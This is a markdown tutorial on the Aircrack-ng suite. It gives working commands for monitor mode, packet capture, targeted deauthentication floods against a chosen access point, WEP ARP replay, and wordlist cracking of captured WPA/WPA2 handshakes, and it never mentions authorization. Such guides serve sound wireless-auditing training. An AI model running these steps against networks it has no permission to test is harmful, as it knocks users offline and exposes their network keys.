# 📡 Aircrack-ng Suite

# 📘 Overview

Aircrack-ng is a powerful open-source suite used for:

* WiFi network auditing
* Wireless analysis
* Packet capture
* Security testing
* Password auditing

Widely used by:

* Penetration testers
* Security researchers
* Wireless auditors

---

# 🎯 Main Areas of Aircrack-ng

* Monitoring
* Attacking
* Testing
* Cracking

---

# ⚙ Installation

```bash
apt install aircrack-ng
```

---

# 🧩 Components of Aircrack-ng Suite

# 1️⃣ Airmon-ng

# 📘 Purpose

Used to enable and manage monitor mode on wireless interfaces.

---

# 🛠 Commands

## Show Interfaces

```bash
airmon-ng
```

---

## Enable Monitor Mode

```bash
airmon-ng start wlan0
```

Creates monitor interface such as:

```text
wlan0mon
```

---

## Disable Monitor Mode

```bash
airmon-ng stop wlan0mon
```

---

# 2️⃣ Airodump-ng

# 📘 Purpose

Used for capturing raw 802.11 wireless packets.

---

# 🛠 Basic Command

```bash
airodump-ng wlan0mon
```

---

# 📊 Important Fields

| Field   | Description              |
| ------- | ------------------------ |
| BSSID   | Access Point MAC address |
| PWR     | Signal strength          |
| Beacons | Number of beacon frames  |
| RXQ     | Receive quality          |
| Data    | Captured data packets    |
| CH      | Channel number           |
| ENC     | Encryption type          |
| CIPHER  | Cipher used              |
| AUTH    | Authentication method    |

---

# 🎯 Capture Specific Target

## Lock to Specific Channel

```bash
airodump-ng --channel 1 wlan0mon
```

---

## Target Specific AP

```bash
airodump-ng --channel 1 --bssid <BSSID> wlan0mon
```

---

# 💾 Save Packet Capture

```bash
airodump-ng --write capture wlan0mon
```

Creates files such as:

```text
capture.cap
```

---

# 👥 Client (Station) Information

| Field   | Description              |
| ------- | ------------------------ |
| STATION | Client MAC address       |
| Lost    | Packets lost             |
| Packets | Number of packets sent   |
| Probes  | SSIDs searched by client |

---

# 📝 Important Notes

* High PWR → Better signal quality
* High Data count → Active network
* Low RXQ → Weak signal/interference
* Probes field useful for Evil Twin attacks

---

# 🚨 Important Deauthentication Workflow Note

For a Deauthentication Attack:

## Step 1

Enable monitor mode.

```bash
airmon-ng start wlan0
```

---

## Step 2

Run airodump-ng to identify:

* Target AP
* Connected clients
* Channel number

```bash
airodump-ng wlan0mon
```

---

## Step 3

Lock airodump-ng to the target channel and AP.

```bash
airodump-ng --channel 1 --bssid <BSSID> wlan0mon
```

✅ This ensures packet capture works only for the selected channel and target AP.

---

## Step 4

Launch deauthentication attack.

```bash
aireplay-ng -0 10 -a <BSSID> wlan0mon
```

---

# 3️⃣ Aireplay-ng

# 📘 Purpose

Used to inject packets and generate wireless traffic.

---

# ⚔ Common Attack Modes

| Mode | Description             |
| ---- | ----------------------- |
| -0   | Deauthentication attack |
| -1   | Fake authentication     |
| -3   | ARP replay attack       |
| -9   | Injection test          |

---

# 🛠 Injection Test

```bash
aireplay-ng -9 wlan0mon
```

✅ Verifies packet injection support.

---

# 🚨 Deauthentication Attack

```bash
aireplay-ng -0 10 -a <BSSID> wlan0mon
```

---

# 📘 Purpose of Deauth Attack

* Forces clients to disconnect
* Triggers reconnection
* Helps capture WPA/WPA2 handshake

---

# 🔁 ARP Replay Attack (WEP)

```bash
aireplay-ng -3 -b <BSSID> wlan0mon
```

---

# 📘 Purpose

* Generates large number of IVs
* Speeds up WEP cracking

---

# 4️⃣ Aircrack-ng

# 📘 Purpose

Used to crack WEP/WPA/WPA2 keys from captured packets.

---

# 🛠 Crack Capture File

```bash
aircrack-ng capture.cap
```

---

# 📚 Use Wordlist

```bash
aircrack-ng -w wordlist.txt capture.cap
```

---

# 🔄 Complete Workflow

# 1️⃣ Enable Monitor Mode

```bash
airmon-ng start wlan0
```

---

# 2️⃣ Capture Packets

```bash
airodump-ng wlan0mon
```

---

# 3️⃣ Target Specific AP

```bash
airodump-ng --channel 1 --bssid <BSSID> wlan0mon
```

---

# 4️⃣ Generate Traffic / Deauth

```bash
aireplay-ng -0 1000 -a <BSSID> wlan0mon
```

---

# 5️⃣ Crack Captured Handshake

```bash
aircrack-ng -w wordlist.txt capture.cap
```

---

# 🛡 Practical Notes

* Monitor mode is required for wireless auditing
* Packet injection support is important
* Always verify correct channel before attacks
* Locking channel improves handshake capture reliability
* Strong signal strength improves capture success
* WPA3 networks are more resistant to offline attacks

---

# 📌 Summary

| Tool        | Purpose                   |
| ----------- | ------------------------- |
| airmon-ng   | Enable monitor mode       |
| airodump-ng | Capture packets           |
| aireplay-ng | Inject packets / attacks  |
| aircrack-ng | Crack captured handshakes |
